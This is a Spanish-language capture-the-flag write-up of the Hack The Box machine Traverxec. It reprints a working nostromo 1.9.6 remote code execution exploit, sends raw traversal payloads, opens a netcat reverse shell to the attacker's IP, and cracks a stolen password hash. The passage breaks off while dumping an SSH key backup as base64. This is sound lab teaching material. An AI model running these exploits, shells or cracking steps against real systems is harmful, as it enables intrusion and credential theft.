---
title: "HTB write-up: Traverxec"
date: 2020-04-12T14:41:19-05:00
description: "Traverxec, escape the pager and crack the hashes"
draft: false
toc: false
images:
tags:
  - hackthebox
  - pentesting
  - HTB
  - boot2root
  - journalctl
  - cracking
  - searchsploit
---

Traverxec de hackthebox, es una maquina Linux de nivel EASY que nos permite explotar un servicio vulnerable a Directory Transversal to Remote Code Execution, realizar ataques de fuerza bruta a hashes de contraseñas y realizar una escalada de privilegios muy coqueta debido al pager por defecto en journalctl.

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![traverxec image](https://www.hackthebox.eu/storage/avatars/6ce5fcdd63f07a5ce91d0b8e4579b163_thumb.png) [traverxec](https://www.hackthebox.eu/home/machines/profile/217) | [jkr](https://www.hackthebox.eu/home/users/profile/77141) | Linux | 10.10.10.165 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-traverxec/cardinfo.png)

# Port Scanning and Service Discovery

Iniciamos por ejecutar un `masscan` para descubrir puertos udp y tcp abiertos, y posteriormente `nmap`, para identificar servicios expuestos en estos puertos:

## masscan

``` text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.165 | tee /home/tony/htb/traverxec/masscan.log

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-21 03:49:45 GMT
-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

## nmap services

``` text
root@laptop:~# nmap -sS -sV -sC -p 22,80 -n --open -v 10.10.10.165 -oN /home/tony/htb/traverxec/services.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 21:56 CST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Initiating Ping Scan at 21:56
Scanning 10.10.10.165 [4 ports]
Completed Ping Scan at 21:56, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:56
Scanning 10.10.10.165 [2 ports]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
Completed SYN Stealth Scan at 21:56, 0.18s elapsed (2 total ports)
Initiating Service scan at 21:56
Scanning 2 services on 10.10.10.165
Completed Service scan at 21:56, 6.29s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.165.
Initiating NSE at 21:56
Completed NSE at 21:56, 4.00s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.51s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Nmap scan report for 10.10.10.165
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Initiating NSE at 21:56
Completed NSE at 21:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

- `-sS` para escaneo TCP vía SYN
- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p 22,80` para escanear solo los puertos TCP 80 y 22
- `-oN` para guardar el output en formato normal o salida por defecto de nmap
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

# Know exploits

El resultado de `nmap` nos devolvió algo interesante sobre el servidor Web: `nostromo 1.9.6`

Tal como hubiera sucedido con apache, nginx y otros populares servidores web, buscamos con el banner de versión, exploits conocidos en [**exploit-database**](https://www.exploit-db.com/).

## searchsploit

``` text
tony@laptop:~/htb/traverxec$ searchsploit nostromo
-------------------------------------------------------------------- -----------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- -----------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                              | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Executio | exploits/linux/remote/35466.sh
-------------------------------------------------------------------- -----------------------------------
Shellcodes: No Result
```

Copiamos con la opción `-m path` el exploit asociado a la versión que tenemos (**1.9.6**):

``` text
tony@laptop:~/htb/traverxec$ searchsploit -m exploits/multiple/remote/47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /home/tony/git/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/tony/htb/traverxec/47837.py
```

Veamos el contenido:

``` python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)

    except IndexError:
        print(help_menu)
```

Como podemos leer en el exploit, es posible hacer un path transversal hacia `/bin/sh` y enviarle en body del post los comandos que va a ejecutar `/bin/sh`. Algo parecido a enviarle por un pipe los comandos a sh.

Nota: No olviden modificar el exploit para poder ejecutarlo correctamente, ya que en la parte superior hay partes no comentadas hasta llegar el shebang.

# Reverse Shell

Empeze primero por probar manualmente el exploit de la siguiente manera con `ncat` y `echo`:

``` bash
tony@laptop:~/htb/traverxec$ echo -e $"POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\nHost: 10.10.10.165Content-Length: 1\r\n\r\necho\necho\nid 2&>1\n" | ncat -vn 10.10.10.165 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.165:80.
HTTP/1.1 200 OK
Date: Sun, 12 Apr 2020 21:09:45 GMT
Server: nostromo 1.9.6
Connection: close


uid=2(bin) gid=2(bin) groups=2(bin)
Ncat: 104 bytes sent, 137 bytes received in 0.72 seconds.
tony@laptop:~/htb/traverxec$
```

Ahora que podemos ejecutar remotamente instrucciones (RCE), podemos buscar como armar una conexión reversa hacia nuestra maquina (reverse shell):

En mi caso inicie con lo mas sencillo, buscar si tenemos `netcat` y que versión/sabor de `netcat` tenemos:

``` text
tony@laptop:~/htb/traverxec$ echo -e $"POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\nHost: 10.10.10.165Content-Length: 1\r\n\r\necho\necho\nwhereis nc 2&>1\n" | ncat -vn 10.10.10.165 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.165:80.
HTTP/1.1 200 OK
Date: Sun, 12 Apr 2020 21:12:17 GMT
Server: nostromo 1.9.6
Connection: close


nc: /usr/bin/nc /usr/bin/nc.traditional /usr/share/man/man1/nc.1.gz
2:
Ncat: 112 bytes sent, 172 bytes received in 1.74 seconds.
```

Para nuestra fortuna tenemos netcat traditional. Esta es la que acepta el conector hacia un programa y nos permite redirigir todo de manera mas fácil. La otra, openbsd, requiere que manualmente nosotros creemos una pipe con mknod o mkfifo para redirigir la entrada y salida.

## Netcat traditional reverse shell

Ahora que hemos probado lo que requerimos, volver al exploit para mostrar su uso:

``` text
tony@laptop:~/htb/traverxec$ ./47837.py 10.10.10.165 80 "nc -e /bin/bash 10.10.14.2 3001"


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

```

El exploit recibe los siguientes argumentos:
- `10.10.10.165`, como la ip del servidor al que nos conectaremos
- `80`, como el puerto donde nos conectaremos donde se ejecuta nostromo
- `nc -e /bin/bash 10.10.14.2 3001`, como el comando a ejecutarse remotamente

El comando nc o `netcat` recibe los argumentos:

- `-e /bin/bash`, la opción `-e` crea la conexión entre la entrada y salida del programa `/bin/bash` y `netcat`
- `10.10.14.2`, es la dirección IP de mi maquina
- `3001`, es el puerto que tengo escuchando por conexiones reversas.

Ahora, antes de ejecutar el comando, preparamos nuestro listener:

``` text
tony@laptop:~$ ncat -vnlp 3001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:44092.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- `-v`, para habilitar el modo *verboso*
- `-n`, para eliminar las resoluciones de DNS
- `-l`, para indicarle el modo de LISTENER en netcat
- `-p 3001`, para especificar el puerto que sera el listener en todas las interfaces.

Como podemos ver, he lanzado el comando `id` que nos ha devuelto la salida del usuario que actualmente esta asociado al proceso que ejecuto el RCE.

# From www-data to david

Como podemos ver tenemos una conexión reversa un poco limitada, así que comencemos por hacer un mejora a una TTY interactiva:

``` text
python --version
python3 --version
Python 3.7.3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec:/usr/bin$
```

Veamos el contenido de `/etc/passwd`:

``` text
www-data@traverxec:/usr/bin$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000:david,,,:/home/david:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

Como podemos ver, solo `root` y `david` pueden tener una shell, así que debemos migrar a _david_ desde **www-data**.

Exploremos la configuración del servicio de nostromo (`/usr/local/sbin/nhttpd`):

Nota: `ps -fea | grep www-data` nos indica los procesos que ejecuta el usuario www-data, ahí veremos que aparte de nuestra reverse shell y la mejora a interactive tty, el proceso nhttpd aka nostromo.

``` text
www-data@traverxec:/usr/bin$ find / -iname nostromo 2>/dev/null
find / -iname nostromo 2>/dev/null
/var/nostromo
www-data@traverxec:/usr/bin$ find /var/nostromo
find /var/nostromo
/var/nostromo
/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
/var/nostromo/conf
/var/nostromo/conf/mimes
/var/nostromo/conf/.htpasswd
/var/nostromo/conf/nhttpd.conf
/var/nostromo/icons
/var/nostromo/icons/dir.gif
/var/nostromo/icons/file.gif
/var/nostromo/htdocs
/var/nostromo/htdocs/js
/var/nostromo/htdocs/js/main.js
/var/nostromo/htdocs/css
/var/nostromo/htdocs/css/style.css
/var/nostromo/htdocs/empty.html
/var/nostromo/htdocs/lib
/var/nostromo/htdocs/lib/prettyphoto
/var/nostromo/htdocs/lib/prettyphoto/js
/var/nostromo/htdocs/lib/prettyphoto/js/prettyphoto.js
/var/nostromo/htdocs/lib/prettyphoto/css
/var/nostromo/htdocs/lib/prettyphoto/css/prettyphoto.css
/var/nostromo/htdocs/lib/prettyphoto/images
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/default_thumbnail.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/contentPatternBottom.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/btnNext.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/contentPatternTop.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/contentPatternRight.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/btnPrevious.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/contentPatternLeft.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/facebook/loader.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/default_thumbnail.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/contentPattern.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/btnNext.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/btnPrevious.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_square/loader.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/default_thumb.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/sprite_next.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/sprite_prev.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/sprite_y.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/sprite_x.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/default/loader.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/default_thumbnail.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/contentPattern.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/btnNext.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/btnPrevious.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/dark_rounded/loader.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square/default_thumbnail.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square/btnNext.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square/btnPrevious.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_square/loader.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded/default_thumbnail.gif
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded/btnNext.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded/btnPrevious.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded/sprite.png
/var/nostromo/htdocs/lib/prettyphoto/images/prettyPhoto/light_rounded/loader.gif
/var/nostromo/htdocs/lib/jquery
/var/nostromo/htdocs/lib/jquery/jquery.min.js
/var/nostromo/htdocs/lib/jquery/jquery.js
/var/nostromo/htdocs/lib/bootstrap
/var/nostromo/htdocs/lib/bootstrap/js
/var/nostromo/htdocs/lib/bootstrap/js/bootstrap.min.js
/var/nostromo/htdocs/lib/bootstrap/js/bootstrap.js
/var/nostromo/htdocs/lib/bootstrap/css
/var/nostromo/htdocs/lib/bootstrap/css/bootstrap.min.css
/var/nostromo/htdocs/lib/bootstrap/css/bootstrap.css
/var/nostromo/htdocs/lib/bootstrap/fonts
/var/nostromo/htdocs/lib/bootstrap/fonts/glyphicons-halflings-regular.ttf
/var/nostromo/htdocs/lib/bootstrap/fonts/glyphicons-halflings-regular.woff2
/var/nostromo/htdocs/lib/bootstrap/fonts/glyphicons-halflings-regular.eot
/var/nostromo/htdocs/lib/bootstrap/fonts/glyphicons-halflings-regular.woff
/var/nostromo/htdocs/lib/bootstrap/fonts/glyphicons-halflings-regular.svg
/var/nostromo/htdocs/lib/isotope
/var/nostromo/htdocs/lib/isotope/isotope.min.js
/var/nostromo/htdocs/lib/hover
/var/nostromo/htdocs/lib/hover/hoverex.min.js
/var/nostromo/htdocs/lib/hover/hoverex-all.css
/var/nostromo/htdocs/lib/hover/hoverdir.js
/var/nostromo/htdocs/lib/php-mail-form
/var/nostromo/htdocs/lib/php-mail-form/validate.js
/var/nostromo/htdocs/lib/ionicons
/var/nostromo/htdocs/lib/ionicons/css
/var/nostromo/htdocs/lib/ionicons/css/ionicons.min.css
/var/nostromo/htdocs/lib/ionicons/fonts
/var/nostromo/htdocs/lib/ionicons/fonts/ionicons.woff
/var/nostromo/htdocs/lib/ionicons/fonts/ionicons.ttf
/var/nostromo/htdocs/lib/ionicons/fonts/ionicons.eot
/var/nostromo/htdocs/lib/ionicons/fonts/ionicons.svg
/var/nostromo/htdocs/index.html
/var/nostromo/htdocs/img
/var/nostromo/htdocs/img/client4.png
/var/nostromo/htdocs/img/client3.png
/var/nostromo/htdocs/img/header-2.jpg
/var/nostromo/htdocs/img/apple-touch-icon.png
/var/nostromo/htdocs/img/sep.jpg
/var/nostromo/htdocs/img/portfolio
/var/nostromo/htdocs/img/portfolio/portfolio_04.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_07.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_10.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_09.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_08.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_01.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_05.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_03.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_06.jpg
/var/nostromo/htdocs/img/portfolio/portfolio_02.jpg
/var/nostromo/htdocs/img/logoclient.png
/var/nostromo/htdocs/img/items.png
/var/nostromo/htdocs/img/client5.png
/var/nostromo/htdocs/img/favicon.png
/var/nostromo/htdocs/img/screen.png
/var/nostromo/htdocs/img/client1.png
/var/nostromo/htdocs/img/header.jpg
/var/nostromo/htdocs/img/client2.png
/var/nostromo/htdocs/Readme.txt
www-data@traverxec:/usr/bin$
```

Resaltan los archivos de configuración `/var/nostromo/conf/nhttpd.conf` y `/var/nostromo/conf/.htpasswd`

``` text
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

En este archivo no tenemos nada realmente interesante, pero veamos el siguiente:

``` text
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/.htpasswd
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Uy, un hash.

## hashcat

Comencemos por identificar el hash de acuerdo a su formato:

``` text
tony@laptop:~$ hashcat --example-hashes | grep '$1' -m2 -A 2 -B 2

MODE: 500
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
PASS: hashcat
```

Nostromo parece utilizar el formato md5crypt para almacenar las contraseñas de los usuarios del htaccess.

Ataquemos por fuerza bruta el hash de david con el diccionario de **rockyou.txt**:

``` text
tony@laptop:~$ ~/tools/hashcat-5.1.0/hashcat64.bin -m500 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' ~/wl/rockyou.txt2 --quiet
clGetDeviceIDs(): CL_DEVICE_NOT_FOUND

clGetDeviceIDs(): CL_DEVICE_NOT_FOUND

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```

Cool. Ahora tenemos las credenciales de david.

> david:Nowonly4me

## ssh as David?

Nos conectamos por SSH como david:

``` text
tony@laptop:~$ ssh david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
david@10.10.10.165's password:
Permission denied, please try again.
david@10.10.10.165's password:
Permission denied, please try again.
david@10.10.10.165's password:
david@10.10.10.165: Permission denied (publickey,password).
```

Ok, o tal vez no. Parece que la contraseña de "david" no es para el usuario.

## Back to home

Continuemos ahora explorando el home de david:

``` text
www-data@traverxec:/usr/bin$ ls /home
ls /home
david
www-data@traverxec:/usr/bin$ ls -lah /home/david
ls -lah /home/david
ls: cannot open directory '/home/david': Permission denied
```

Como podemos ver, no tenemos acceso al directorio home de david, pero aquí es donde volviendo a las notas previas nos damos cuenta del siguiente detalle en el archivo de configuración de nostromo:

``` text
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Ahora con este conocimiento, y tras leer el manual de configuración, tratemos de listar el directorio:

``` text
www-data@traverxec:/usr/bin$ ls -la /home/david/public_www/
ls -la /home/david/public_www/
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/usr/bin$ ls -la /home/david/public_www/protected-file-area
ls -la /home/david/public_www/protected-file-area
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/usr/bin$ ls -la /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
ls -la /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
-rw-r--r-- 1 david david 1915 Oct 25 17:02 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
www-data@traverxec:/usr/bin$ base64 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
base64 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
/w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465
QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaip
